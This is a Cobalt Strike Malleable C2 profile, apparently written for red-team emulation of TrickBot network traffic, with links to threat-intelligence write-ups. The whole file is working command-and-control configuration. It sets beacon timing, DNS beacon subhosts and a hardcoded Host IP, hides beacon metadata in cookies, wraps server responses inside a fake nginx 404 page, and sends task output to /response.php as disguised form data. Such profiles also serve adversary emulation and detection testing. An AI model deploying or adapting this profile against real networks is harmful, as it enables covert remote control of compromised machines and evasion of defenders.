#trickbot
#https://community.rsa.com/community/products/netwitness/blog/2017/07/13/necurs-delivers
#https://securityintelligence.com/tricks-of-the-trade-a-deeper-look-into-trickbots-machinations/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}


http-get {

    set uri "/";
    
    client {

	header "Host" "203.150.19.63:443";
	header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";
        
        
        metadata {
            base64url;
	    prepend "D007=";
            header "Cookie";


        }

    }

    server {

	header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html";       
	header "Connection" "keep-alive";
        
	
        output {
            base64url;
	    prepend "<html>
	    <head><title>404 Not Found</title></head>
	    <body bgcolor='white'>
	    <center><h1>404 Not Found</h1></center>
	    <hr><center>nginx</center>
	    </body>
	    </html>
	    <!CDATA['=";
	    append "']>
	    </html>";
	    print;
        }
    }
}

http-post {
    
    set uri "/response.php";

    client {
       
	header "Content-Type" "multipart/form-data; boundary=----ZMZTCR";
        
        output {
            netbios; 
	    prepend "----ZMZTCR
	    Content-Disposition: form-data;name='sourcelink' ";

	    append " Content-Disposition: form-data;name='sourcequery'
	    ----ZMZTCR";
	    print;
	    


        }
        
        
        id {
            base64url;
	    header "Cookie";


        }
    }

    server {

	header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html; charset=utf-8";        
	header "Connection" "keep-alive";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {
    server {
        header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html; charset=utf-8";        
	header "Connection" "keep-alive";
    
    }


}
